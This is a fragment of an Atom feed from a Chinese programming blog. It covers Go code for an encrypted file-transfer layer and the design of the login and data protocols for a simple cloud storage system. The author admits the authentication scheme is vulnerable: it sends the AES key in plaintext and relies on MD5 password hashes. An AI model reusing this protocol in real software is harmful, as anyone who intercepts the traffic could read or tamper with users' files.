class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err.Error() == &lt;span class=&quot;string&quot;&gt;&quot;EOF&quot;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf, auth.Int64ToBytes(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(length)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		encoded := auth.AesEncode(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:length+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;], t.block)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:], auth.Int64ToBytes(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(encoded)+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:], encoded)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		_, err = t.conn.Write(t.buf[:&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(encoded)+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sendLength -= &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; length == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;RecvToWriter(*bufio.Writer) bool&lt;/code&gt; 方法实现代码如下，它和 &lt;code&gt;RecvBytes()&lt;/code&gt; 的主要不同在于，在函数退出时需要使用 Writer 的 &lt;code&gt;Flush()&lt;/code&gt; 方法将缓冲区数据全部写入，并且在 Writer 写入的过程中需要检查写入是否正确。此外，增加了 &lt;code&gt;valid&lt;/code&gt; 变量，因为 Writer 写入的错误不应当影响网络连接的传输，因此当出现本地系统错误时，为了不破坏传输，将使 &lt;code&gt;valid&lt;/code&gt; 为 FALSE，但传输将继续进行，最终返回给用户的值为 FALSE。这里的实现非常不人性化，另一种实现方式是，无论出现的错误是用户客户端本地错误还是网络连接错误，均直接返回 FALSE，通常应用 &lt;code&gt;RecvToWriter&lt;/code&gt; 的场景是传输长数据流，在返回 FALSE 时，多数调用 transmitter 的父函数会立刻命令 transmitter 终止。因此这里直接返回 FALSE 可能是更好的实现方式，避免了不必要的带宽浪费。这里经过权衡，最终代码中选择直接返回 FALSE，但这里保留使用 valid 变量的代码留作对比。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; (t *transmitter) RecvToWriter(writer *bufio.Writer) &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; err error&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; t.buf == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; || t.conn == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	chRate := time.Tick(&lt;span class=&quot;number&quot;&gt;1e3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	length, err := t.RecvUntil(&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, t.recvLen, chRate)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	totalLength := auth.BytesToInt64(t.buf[:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; valid &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt; = &lt;span class=&quot;constant&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; recvLength &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; plength &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; elength &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; pRecv &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = length - &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt;() &amp;#123; t.recvLen = pRecv &amp;#125;()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf, t.buf[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:length])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; recvLength == &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(totalLength) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			writer.Flush()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; valid&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pRecv, err = t.RecvUntil(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;), pRecv, chRate)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		plength = auth.BytesToInt64(t.buf[:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		elength = auth.BytesToInt64(t.buf[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pRecv, err = t.RecvUntil(elength, pRecv, chRate)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		receive, err := auth.AesDecode(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:elength], plength, t.block)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			valid = &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		outputLength, outputError := writer.Write(receive)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; outputError != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; || outputLength != &lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt;(plength) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			valid = &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		recvLength = recvLength + plength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf, t.buf[elength:pRecv])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pRecv -= elength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Transmitable-接口的调用&quot;&gt;&lt;a href=&quot;#Transmitable-接口的调用&quot; class=&quot;headerlink&quot; title=&quot;Transmitable 接口的调用&quot;&gt;&lt;/a&gt;Transmitable 接口的调用&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;当试图发送一个文本类型的指令 &lt;code&gt;command&lt;/code&gt; 时，Transmitable 变量可以直接调用 &lt;code&gt;SendBytes(command)&lt;/code&gt;，远端调用 &lt;code&gt;RecvBytes()&lt;/code&gt; 即可获取 &lt;code&gt;command&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;当试图发送一个文件时，发送端创建一个 Reader 对象 &lt;code&gt;reader&lt;/code&gt; 并获取文件大小 &lt;code&gt;length&lt;/code&gt;，调用 &lt;code&gt;SendFromReader(reader, length)&lt;/code&gt;，接收端创建一个 Writer 对象 &lt;code&gt;writer&lt;/code&gt;，调用 &lt;code&gt;RecvToWriter(writer)&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;专栏目录：&lt;a href=&quot;http://blog.forec.cn/columns/cloud-storage.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;云存储系统从入门到放弃&lt;/a&gt;&lt;br&gt;此专栏的上一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统认证、传输协议设计&lt;/a&gt;&lt;br&gt;此专栏的下一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/15/cloud-storage-system-3/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统认证基础模块实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/14/cloud-storage-system-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/14/cloud-storage-system-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/14/cloud-storage-system-2/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;使用 Golang 实现&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot;&gt;上一篇文章&lt;/a&gt;设计的云存储系统文件传输协议。将实现代码封装，提供外部访问接口。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://forec.github.io/categories/Code/"/>
    
    
      <category term="Golang" scheme="http://forec.github.io/tags/Golang/"/>
    
      <category term="云存储" scheme="http://forec.github.io/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
    
      <category term="线程" scheme="http://forec.github.io/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>简易云存储系统认证、传输协议设计</title>
    <link href="http://forec.github.io/2016/11/13/cloud-storage-system-1/"/>
    <id>http://forec.github.io/2016/11/13/cloud-storage-system-1/</id>
    <published>2016-11-13T04:32:01.000Z</published>
    <updated>2016-11-18T13:24:51.730Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;分析、设计简易云存储系统之间的协议，包括用户客户端和服务器之间的认证协议、数据传输的协议以及新加入线程的认证。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;保活连接&quot;&gt;&lt;a href=&quot;#保活连接&quot; class=&quot;headerlink&quot; title=&quot;保活连接&quot;&gt;&lt;/a&gt;保活连接&lt;/h1&gt;&lt;p&gt;服务器和客户端之间应当维护几个固定连接，同时随用户发起的文件传输任务，二者间应建立一些短时间的活动连接。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于命令和文本数据传输的交互连接：此连接用于用户向服务器发送命令和接收服务器返回的文本响应，云存储服务器将会把客户端登录、认证时创建的连接作为该连接，在客户端活动期间，此连接应始终保持活动。&lt;/li&gt;
&lt;li&gt;客户端用于接收推送消息的连接：单向连接，仅用于客户端接收服务器推送的消息，在客户端活动期间，此连接应始终保持活动。&lt;/li&gt;
&lt;li&gt;客户端用于上传/下载文件的连接：此连接应在需要时建立，传输任务完成时断开。服务器应当限制每个客户端持有此类连接的数量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;用户登录认证协议&quot;&gt;&lt;a href=&quot;#用户登录认证协议&quot; class=&quot;headerlink&quot; title=&quot;用户登录认证协议&quot;&gt;&lt;/a&gt;用户登录认证协议&lt;/h1&gt;&lt;h2 id=&quot;认证流程&quot;&gt;&lt;a href=&quot;#认证流程&quot; class=&quot;headerlink&quot; title=&quot;认证流程&quot;&gt;&lt;/a&gt;认证流程&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;根据上一篇文章中的需求，要实现的云存储系统应当能保证客户端和服务器之间传输的文件内容不被拦截，或者即时被中间人拦截也无法获取原始信息。要实现这一点，必须对传输的消息进行加密，而通信双方均需具有对加密消息解密的能力，因此双方均需持有密钥。非对称加密方式中，通信双方只有持有私钥的一方能够解密，因此如果采用非对称加密，服务器和客户端均需持有自己的私钥和对方的公钥。一个可行的方案是：当用户注册/登陆时，客户端随机生成一组密钥，并和服务器交换公钥，双方使用对方的公钥加密要传输的信息。&lt;/li&gt;
&lt;li&gt;在将要实现的云存储系统中，我没有采用上面的方式，而是采用了 AES CFB 对称加密，因为后者相对更容易实现。如果项目完成后还有空余时间，我将更换认证方式。&lt;strong&gt;下面要介绍的云存储系统登录认证协议存在漏洞&lt;/strong&gt;，传输消息可能被拦截、破解。如果中间人拦截到了通信双方使用的随机密钥，则可根据协议构造特定的攻击数据包，获取或破坏用户空间。&lt;/li&gt;
&lt;li&gt;客户端和服务器建立连接并认证的过程使用协议如下：&lt;ul&gt;
&lt;li&gt;客户端向服务器发起 TCP 请求，服务器监听到请求并建立 Socket 连接&lt;/li&gt;
&lt;li&gt;服务器随机生成固定长度的随机密钥 token 并以明文方式发送给客户端&lt;/li&gt;
&lt;li&gt;客户端接收 token，并使用 token 加密用户名和密码的 MD5 值，将加密后的数据发送给服务器&lt;/li&gt;
&lt;li&gt;服务器接收客户端发送的认证信息，使用 token 对消息解密，获取用户名和密码的 MD5 值，将密码与数据库中存储的密码 MD5 值比对，验证通过则向客户端发送使用 token 加密的 token，否则主动断开连接&lt;/li&gt;
&lt;li&gt;客户端等待服务器返回数据或检测到服务器断开连接。如果客户端接收到的数据解密结果不是 token，则主动断开连接并提示认证失败&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;认证数据协议格式&quot;&gt;&lt;a href=&quot;#认证数据协议格式&quot; class=&quot;headerlink&quot; title=&quot;认证数据协议格式&quot;&gt;&lt;/a&gt;认证数据协议格式&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;假定现在已有函数 &lt;code&gt;RecvBytes()&lt;/code&gt; ，该函数将在后面的&lt;a href=&quot;http://blog.forec.cn/2016/11/14/cloud-storage-system-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《传输协议的实现和封装》&lt;/a&gt;中介绍，它将返回一组维持边界的消息，即该函数能够从 Socket 缓冲区中恰好读取出一组符合协议格式的数据。下面定义协议格式。&lt;/li&gt;
&lt;li&gt;服务器生成固定长度随机密钥后，直接向 socket 缓冲区写入该密钥的明文：&lt;code&gt;conn.Write([]byte(token))&lt;/code&gt;。因为接下来服务器需要等待客户端响应，因此客户端不需要考虑消息边界，只需要从缓冲区中读取固定长度的字节即可。&lt;/li&gt;
&lt;li&gt;客户端从 socket 接收固定长度的 token。&lt;/li&gt;
&lt;li&gt;客户端将用户名和密码的 MD5 值使用 token 加密，发送给服务器的包结构如下。因为 AES CFB 算法解密需要获知明文长度，因此传输的包中应当包含该信息：第一个 8 字节表示用户名明文和密码 MD5 值的总长度，第二个 8 字节表示使用 token 将用户名和密码 MD5 值加密后得到的密文长度，第三个 8 字节表示用户名明文的长度，最后跟着密文。前面的三个 8 字节均为 int64 类型的数据的大端序表示。下面称此格式为 &lt;strong&gt;格式0&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight livecodeserver&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;---------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;bytes&lt;/span&gt;  |  &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;bytes&lt;/span&gt;  |  &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;bytes&lt;/span&gt;  |  encoded username &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; password  |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;---------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;服务器接收到客户端发送的认证包，按大端序将包的前 24 个字节分别转化为 3 个 int64 类型，并使用 token 解密后面的密文。如果验证成功，则按照下面 “数据传输协议” 中的 “格式1” 将 token 传输给客户端。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;数据传输协议&quot;&gt;&lt;a href=&quot;#数据传输协议&quot; class=&quot;headerlink&quot; title=&quot;数据传输协议&quot;&gt;&lt;/a&gt;数据传输协议&lt;/h1&gt;&lt;p&gt;当客户端和服务器建立连接并认证成功后，所有的数据传输操作均应当遵从以下协议。&lt;/p&gt;
&lt;h2 id=&quot;数据协议格式&quot;&gt;&lt;a href=&quot;#数据协议格式&quot; class=&quot;headerlink&quot; title=&quot;数据协议格式&quot;&gt;&lt;/a&gt;数据协议格式&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;应用层数据包格式如下，第一个 8 字节表示明文长度，第二个 8 字节表示密文长度 + 16，后跟密文。两个 8 字节均为大端序表示的 int64 类型。下面称此格式为 &lt;strong&gt;格式1&lt;/strong&gt; 。&lt;/li&gt;
&lt;/ul&gt;
